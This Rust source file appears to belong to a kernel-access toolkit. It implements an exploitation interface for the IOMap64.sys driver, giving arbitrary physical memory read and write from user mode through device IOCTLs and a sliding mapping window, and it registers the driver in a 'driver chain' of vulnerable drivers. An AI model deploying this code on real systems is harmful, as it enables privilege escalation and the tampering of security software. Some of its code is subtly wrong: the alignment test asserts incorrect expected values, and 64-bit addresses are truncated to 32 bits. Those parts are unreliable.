//! IOMap64.sys Driver Backend
//!
//! IOMap64 - Physical memory mapping driver exploitation interface
//! Device: \\.\IOMap
//!
//! Capabilities:
//! - Physical memory read/write via mapped sliding window
//! - Two window sizes: 16MB (selector=0) or 256KB (selector=1)
//! - Up to 16 concurrent mapping slots (index 0..15)
//!
//! Technique: The driver maps physical pages into the process address space
//! via a shared section. Reads/writes are performed against offsets within
//! the currently mapped window. To access arbitrary physical memory, the
//! window must be remapped (slid) to cover the target address.
//!
//! STATIC ANALYSIS ONLY - Do not load the driver.

use std::io;
use std::mem;
use std::ptr;

// Windows FFI
#[cfg(windows)]
mod ffi {
    use std::ffi::c_void;

    pub type HANDLE = *mut c_void;
    pub type DWORD = u32;
    pub type BOOL = i32;
    pub type LPCWSTR = *const u16;

    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
    pub const GENERIC_READ: DWORD = 0x80000000;
    pub const GENERIC_WRITE: DWORD = 0x40000000;
    pub const FILE_SHARE_READ: DWORD = 0x00000001;
    pub const FILE_SHARE_WRITE: DWORD = 0x00000002;
    pub const OPEN_EXISTING: DWORD = 3;
    pub const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;

    extern "system" {
        pub fn CreateFileW(
            lpFileName: LPCWSTR,
            dwDesiredAccess: DWORD,
            dwShareMode: DWORD,
            lpSecurityAttributes: *mut c_void,
            dwCreationDisposition: DWORD,
            dwFlagsAndAttributes: DWORD,
            hTemplateFile: HANDLE,
        ) -> HANDLE;

        pub fn DeviceIoControl(
            hDevice: HANDLE,
            dwIoControlCode: DWORD,
            lpInBuffer: *const c_void,
            nInBufferSize: DWORD,
            lpOutBuffer: *mut c_void,
            nOutBufferSize: DWORD,
            lpBytesReturned: *mut DWORD,
            lpOverlapped: *mut c_void,
        ) -> BOOL;

        pub fn CloseHandle(hObject: HANDLE) -> BOOL;
        pub fn GetLastError() -> DWORD;
    }
}

// =============================================================================
// IOCTL Codes
// =============================================================================

/// Map a physical address range into the process (creates mapping slot)
/// Input: MapPhysicalInput (24 bytes)
/// Output: mapping handle/base address
pub const IOCTL_MAP_PHYSICAL: u32 = 0x83002138;

/// Read from the currently mapped region at a given offset
/// Input: offset within mapped window (u32)
/// Output: value at that offset (u32)
pub const IOCTL_READ_MAPPED: u32 = 0x83002104;

/// Write to the currently mapped region at a given offset
/// Input: offset (u32) + value (u32)
pub const IOCTL_WRITE_MAPPED: u32 = 0x83002108;

// =============================================================================
// Window Size Constants
// =============================================================================

/// 16 MB window (selector = 0)
pub const WINDOW_SIZE_16MB: usize = 16 * 1024 * 1024;

/// 256 KB window (selector = 1)
pub const WINDOW_SIZE_256KB: usize = 256 * 1024;

/// Maximum mapping slot index (0..15)
pub const MAX_SLOT_INDEX: u16 = 0x0F;

// =============================================================================
// Input/Output Structures
// =============================================================================

/// Map physical memory input (24 bytes)
/// Sent to IOCTL_MAP_PHYSICAL to establish a mapping window
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct MapPhysicalInput {
    /// Mapping slot index (0..15, must be < 0x10)
    pub index: u16,
    /// Padding to align phys_addr at offset 4
    pub _pad: u16,
    /// Physical base address to map (offset 4)
    pub phys_addr: u32,
    /// Reserved / additional address bits
    pub _reserved: [u8; 12],
    /// Window size selector at offset 20: 0 = 16MB, 1 = 256KB
    pub selector: u16,
    /// Padding
    pub _pad2: u16,
}

/// Read from mapped region input (4 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct ReadMappedInput {
    /// Offset within the mapped window
    pub offset: u32,
}

/// Write to mapped region input (8 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct WriteMappedInput {
    /// Offset within the mapped window
    pub offset: u32,
    /// Value to write at that offset
    pub value: u32,
}

// =============================================================================
// Driver Handle
// =============================================================================

/// Handle to the IOMap64 driver device with sliding window state
pub struct IoMap64Driver {
    handle: ffi::HANDLE,
    /// Currently mapped physical base address (None if unmapped)
    mapped_base: Option<u64>,
    /// Current window size in bytes
    window_size: usize,
    /// Active mapping slot index
    active_slot: u16,
}

impl IoMap64Driver {
    /// Device path for usermode access
    const DEVICE_PATH: &'static str = "\\\\.\\IOMap";

    /// Open a handle to the IOMap64 device.
    /// Requires the driver to already be loaded.
    pub fn open() -> io::Result<Self> {
        let wide_path: Vec<u16> = Self::DEVICE_PATH
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let handle = unsafe {
            ffi::CreateFileW(
                wide_path.as_ptr(),
                ffi::GENERIC_READ | ffi::GENERIC_WRITE,
                ffi::FILE_SHARE_READ | ffi::FILE_SHARE_WRITE,
                ptr::null_mut(),
                ffi::OPEN_EXISTING,
                ffi::FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            )
        };

        if handle == ffi::INVALID_HANDLE_VALUE {
            return Err(io::Error::last_os_error());
        }

        Ok(Self {
            handle,
            mapped_base: None,
            window_size: WINDOW_SIZE_16MB,
            active_slot: 0,
        })
    }

    /// Send an IOCTL to the driver (generic helper)
    fn ioctl(
        &self,
        code: u32,
        input: *const u8,
        input_len: u32,
        output: *mut u8,
        output_len: u32,
    ) -> io::Result<u32> {
        let mut bytes_returned: u32 = 0;

        let result = unsafe {
            ffi::DeviceIoControl(
                self.handle,
                code,
                input as *const _,
                input_len,
                output as *mut _,
                output_len,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };

        if result == 0 {
            Err(io::Error::last_os_error())
        } else {
            Ok(bytes_returned)
        }
    }

    // =========================================================================
    // Mapping Operations
    // =========================================================================

    /// Map a physical address range using the specified slot and window size.
    /// selector: 0 = 16MB window, 1 = 256KB window
    pub fn map_physical(
        &mut self,
        phys_addr: u64,
        slot: u16,
        selector: u16,
    ) -> io::Result<()> {
        if slot > MAX_SLOT_INDEX {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                format!("Slot index {} exceeds maximum (0x0F)", slot),
            ));
        }

        let window_size = match selector {
            0 => WINDOW_SIZE_16MB,
            1 => WINDOW_SIZE_256KB,
            _ => {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "Invalid selector: must be 0 (16MB) or 1 (256KB)",
                ));
            }
        };

        // Align physical address to window boundary
        let aligned_base = phys_addr & !(window_size as u64 - 1);

        let input = MapPhysicalInput {
            index: slot,
            _pad: 0,
            phys_addr: aligned_base as u32,
            _reserved: [0u8; 12],
            selector,
            _pad2: 0,
        };

        self.ioctl(
            IOCTL_MAP_PHYSICAL,
            &input as *const _ as *const u8,
            mem::size_of::<MapPhysicalInput>() as u32,
            ptr::null_mut(),
            0,
        )?;

        self.mapped_base = Some(aligned_base);
        self.window_size = window_size;
        self.active_slot = slot;

        Ok(())
    }

    /// Unmap the current window (release the mapping slot).
    /// The driver typically unmaps on close, but this allows explicit cleanup.
    pub fn unmap(&mut self) {
        self.mapped_base = None;
    }

    // =========================================================================
    // Low-Level Read/Write (within current window)
    // =========================================================================

    /// Read a u32 at the given offset within the currently mapped window.
    /// The offset must be within [0, window_size - 4].
    pub fn read_at_offset(&self, offset: u32) -> io::Result<u32> {
        if self.mapped_base.is_none() {
            return Err(io::Error::new(
                io::ErrorKind::NotConnected,
                "No physical region is currently mapped",
            ));
        }

        if offset as usize >= self.window_size {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                format!(
                    "Offset 0x{:X} exceeds window size 0x{:X}",
                    offset, self.window_size
                ),
            ));
        }

        let input = ReadMappedInput { offset };
        let mut output: u32 = 0;

        self.ioctl(
            IOCTL_READ_MAPPED,
            &input as *const _ as *const u8,
            mem::size_of::<ReadMappedInput>() as u32,
            &mut output as *mut _ as *mut u8,
            4,
        )?;

        Ok(output)
    }

    /// Write a u32 at the given offset within the currently mapped window.
    /// The offset must be within [0, window_size - 4].
    pub fn write_at_offset(&self, offset: u32, value: u32) -> io::Result<()> {
        if self.mapped_base.is_none() {
            return Err(io::Error::new(
                io::ErrorKind::NotConnected,
                "No physical region is currently mapped",
            ));
        }

        if offset as usize >= self.window_size {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                format!(
                    "Offset 0x{:X} exceeds window size 0x{:X}",
                    offset, self.window_size
                ),
            ));
        }

        let input = WriteMappedInput { offset, value };

        self.ioctl(
            IOCTL_WRITE_MAPPED,
            &input as *const _ as *const u8,
            mem::size_of::<WriteMappedInput>() as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    // =========================================================================
    // Sliding Window Physical Memory Access
    // =========================================================================

    /// Read physical memory at an arbitrary address by sliding the mapping window.
    /// Automatically remaps when the target address falls outside the current window.
    /// Returns a Vec<u8> containing the read data.
    pub fn read_physical_memory(&mut self, phys_addr: u64, size: usize) -> io::Result<Vec<u8>> {
        if size == 0 {
            return Ok(Vec::new());
        }

        let mut result = Vec::with_capacity(size);
        let mut remaining = size;
        let mut current_addr = phys_addr;

        while remaining > 0 {
            // Check if we need to remap
            let needs_remap = match self.mapped_base {
                None => true,
                Some(base) => {
                    current_addr < base || current_addr >= base + self.window_size as u64
                }
            };

            if needs_remap {
                // Align to window boundary and remap
                let selector = if self.window_size == WINDOW_SIZE_256KB { 1 } else { 0 };
                self.map_physical(current_addr, self.active_slot, selector)?;
            }

            let base = self.mapped_base.unwrap();
            let offset_in_window = (current_addr - base) as u32;
            let available_in_window = self.window_size - offset_in_window as usize;
            let chunk_size = remaining.min(available_in_window);

            // Read in u32-aligned chunks
            let mut pos = 0;
            while pos < chunk_size {
                let read_offset = offset_in_window + pos as u32;
                let dword = self.read_at_offset(read_offset)?;
                let bytes = dword.to_le_bytes();

                let to_copy = (chunk_size - pos).min(4);
                result.extend_from_slice(&bytes[..to_copy]);
                pos += 4;
            }

            // Trim any excess bytes from the last dword read
            result.truncate(result.len().min(size));

            remaining -= chunk_size;
            current_addr += chunk_size as u64;
        }

        result.truncate(size);
        Ok(result)
    }

    /// Write physical memory at an arbitrary address by sliding the mapping window.
    /// Automatically remaps when the target address falls outside the current window.
    pub fn write_physical_memory(&mut self, phys_addr: u64, data: &[u8]) -> io::Result<()> {
        if data.is_empty() {
            return Ok(());
        }

        let mut remaining = data.len();
        let mut current_addr = phys_addr;
        let mut data_offset = 0usize;

        while remaining > 0 {
            // Check if we need to remap
            let needs_remap = match self.mapped_base {
                None => true,
                Some(base) => {
                    current_addr < base || current_addr >= base + self.window_size as u64
                }
            };

            if needs_remap {
                let selector = if self.window_size == WINDOW_SIZE_256KB { 1 } else { 0 };
                self.map_physical(current_addr, self.active_slot, selector)?;
            }

            let base = self.mapped_base.unwrap();
            let offset_in_window = (current_addr - base) as u32;
            let available_in_window = self.window_size - offset_in_window as usize;
            let chunk_size = remaining.min(available_in_window);

            // Write in u32 chunks
            let mut pos = 0;
            while pos < chunk_size {
                let write_offset = offset_in_window + pos as u32;
                let end = (pos + 4).min(chunk_size);
                let slice = &data[data_offset + pos..data_offset + end];

                // For sub-dword writes, read-modify-write
                let value = if slice.len() < 4 {
                    let existing = self.read_at_offset(write_offset)?;
                    let mut buf = existing.to_le_bytes();
                    buf[..slice.len()].copy_from_slice(slice);
                    u32::from_le_bytes(buf)
                } else {
                    u32::from_le_bytes([slice[0], slice[1], slice[2], slice[3]])
                };

                self.write_at_offset(write_offset, value)?;
                pos += 4;
            }

            remaining -= chunk_size;
            current_addr += chunk_size as u64;
            data_offset += chunk_size;
        }

        Ok(())
    }

    // =========================================================================
    // Convenience Helpers
    // =========================================================================

    /// Read a u32 from an arbitrary physical address
    pub fn read_phys_u32(&mut self, phys_addr: u64) -> io::Result<u32> {
        let data = self.read_physical_memory(phys_addr, 4)?;
        Ok(u32::from_le_bytes([data[0], data[1], data[2], data[3]]))
    }

    /// Read a u64 from an arbitrary physical address
    pub fn read_phys_u64(&mut self, phys_addr: u64) -> io::Result<u64> {
        let data = self.read_physical_memory(phys_addr, 8)?;
        Ok(u64::from_le_bytes([
            data[0], data[1], data[2], data[3],
            data[4], data[5], data[6], data[7],
        ]))
    }

    /// Write a u32 to an arbitrary physical address
    pub fn write_phys_u32(&mut self, phys_addr: u64, value: u32) -> io::Result<()> {
        self.write_physical_memory(phys_addr, &value.to_le_bytes())
    }

    /// Write a u64 to an arbitrary physical address
    pub fn write_phys_u64(&mut self, phys_addr: u64, value: u64) -> io::Result<()> {
        self.write_physical_memory(phys_addr, &value.to_le_bytes())
    }

    /// Set the preferred window size for subsequent operations.
    /// Smaller windows (256KB) may be more reliable on some systems.
    pub fn set_window_size(&mut self, use_small_window: bool) {
        self.window_size = if use_small_window {
            WINDOW_SIZE_256KB
        } else {
            WINDOW_SIZE_16MB
        };
    }

    /// Check if a mapping is currently active
    pub fn is_mapped(&self) -> bool {
        self.mapped_base.is_some()
    }

    /// Get the current mapped base address (if any)
    pub fn current_mapping(&self) -> Option<(u64, usize)> {
        self.mapped_base.map(|base| (base, self.window_size))
    }
}

impl Drop for IoMap64Driver {
    fn drop(&mut self) {
        if self.handle != ffi::INVALID_HANDLE_VALUE {
            unsafe {
                ffi::CloseHandle(self.handle);
            }
            self.handle = ffi::INVALID_HANDLE_VALUE;
        }
    }
}

// Safety: The handle is only used via DeviceIoControl which is thread-safe
unsafe impl Send for IoMap64Driver {}

// =============================================================================
// Integration with driver chain
// =============================================================================

/// Driver info for the driver chain priority system
pub struct IoMap64Info;

impl IoMap64Info {
    pub const DRIVER_FILE: &'static str = "IOMap64.sys";
    pub const DEVICE_PATH: &'static str = "\\\\.\\IOMap";
    pub const SERVICE_NAME: &'static str = "IOMap64";
    pub const REGISTRY_PATH: &'static str =
        "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\IOMap64";

    /// Check if driver is already loaded by attempting to open the device
    pub fn is_loaded() -> bool {
        IoMap64Driver::open().is_ok()
    }

    /// Priority in driver chain (lower = preferred)
    /// Physical memory only - no MSR/PCI support
    pub const CHAIN_PRIORITY: u32 = 5;
}

// =============================================================================
// Tests (compile-time only, do not run without driver loaded)
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_struct_sizes() {
        assert_eq!(mem::size_of::<MapPhysicalInput>(), 24);
        assert_eq!(mem::size_of::<ReadMappedInput>(), 4);
        assert_eq!(mem::size_of::<WriteMappedInput>(), 8);
    }

    #[test]
    fn test_window_alignment() {
        // 16MB alignment
        let addr: u64 = 0x1234_5678;
        let aligned = addr & !(WINDOW_SIZE_16MB as u64 - 1);
        assert_eq!(aligned, 0x0100_0000);

        // 256KB alignment
        let aligned_small = addr & !(WINDOW_SIZE_256KB as u64 - 1);
        assert_eq!(aligned_small, 0x1230_0000);
    }

    #[test]
    fn test_ioctl_codes() {
        // All IOCTLs share device type 0x8300
        assert_eq!(IOCTL_MAP_PHYSICAL >> 16, 0x8300);
        assert_eq!(IOCTL_READ_MAPPED >> 16, 0x8300);
        assert_eq!(IOCTL_WRITE_MAPPED >> 16, 0x8300);
    }

    #[test]
    fn test_slot_validation() {
        // Slot must be < 0x10
        assert!(MAX_SLOT_INDEX < 0x10);
    }
}
